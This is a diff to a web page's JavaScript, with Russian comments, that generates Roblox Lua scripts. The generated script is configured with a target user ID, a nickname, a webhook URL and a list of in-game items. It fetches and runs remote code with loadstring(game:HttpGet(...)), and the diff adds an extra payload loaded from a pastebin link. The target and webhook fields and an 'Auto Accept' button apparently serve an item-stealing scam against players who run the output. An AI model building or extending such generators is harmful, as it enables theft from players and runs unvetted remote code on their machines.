@@ -50,7 +50,6 @@ const allBrainrots = [
     "La Vacca Saturno Saturnita", "Jackorilla", "Secret Lucky Block"
 ];
 
-// Заполнение списка чекбоксами
 function populateBrainrotsList() {
     const container = document.getElementById('brainrotsList');
     if (!container) return;
@@ -69,7 +68,7 @@ function populateBrainrotsList() {
     });
 }
 
-// Поиск по списку
+// Поиск
 const searchInput = document.getElementById('searchBrainrots');
 if (searchInput) {
     searchInput.addEventListener('input', (e) => {
@@ -107,7 +106,7 @@ document.querySelectorAll('input[name="scriptType"]').forEach(radio => {
     });
 });
 
-// Генерация скрипта
+// Генерация
 const generateBtn = document.getElementById('generateBtn');
 if (generateBtn) {
     generateBtn.addEventListener('click', () => {
@@ -131,12 +130,14 @@ if (generateBtn) {
             return;
         }
 
-        let loadLine = '';
+        // Дополнительный скрипт
+        let extraScript = '';
         if (scriptType === '22s') {
-            loadLine = 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()';
+            extraScript = 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()';
         } else if (scriptType === 'custom') {
-            loadLine = customScript;
+            extraScript = customScript;
         }
+        // if "none" — extraScript остаётся пустой строкой
 
         const brainrotListStr = "{\n    " + selected.map(br => `"${br}"`).join(",\n    ") + "\n}";
 
@@ -145,12 +146,18 @@ local CONFIG = {
     TARGET_USER_ID = "${userId}",
     TARGET_NAME = "${nick}",
     WEBHOOK_URL = "${webhook}",
-    TARGET_BRAINROTS = ${brainrotListStr}
+    TARGET_BRAINROTS = ${brainrotListStr},
+    EXTRA_SCRIPT = [[${extraScript}]]
 }
 -- ========== END CONFIG ==========
 
 -- Load main script
-loadstring(game:HttpGet("YOUR_MAIN_SCRIPT_URL"))()`;
+loadstring(game:HttpGet("YOUR_MAIN_SCRIPT_URL"))()
+
+-- Load extra script if exists
+if CONFIG.EXTRA_SCRIPT and CONFIG.EXTRA_SCRIPT ~= "" then
+    loadstring(CONFIG.EXTRA_SCRIPT)()
+end`;
 
         const outputDiv = document.getElementById('output');
         const scriptOutput = document.getElementById('scriptOutput');
@@ -171,7 +178,7 @@ if (copyBtn) {
     });
 }
 
-// Discord кнопка
+// Discord
 const discordBtn = document.getElementById('discordBtn');
 if (discordBtn) {
     discordBtn.addEventListener('click', () => {
@@ -179,7 +186,7 @@ if (discordBtn) {
     });
 }
 
-// Auto Accept кнопка (копирует только AUTOACCEPT)
+// Auto Accept
 const autoacceptBtn = document.getElementById('autoacceptBtn');
 if (autoacceptBtn) {
     autoacceptBtn.addEventListener('click', () => {
@@ -188,5 +195,4 @@ if (autoacceptBtn) {
     });
 }
 
-// Запуск заполнения списка
 populateBrainrotsList();
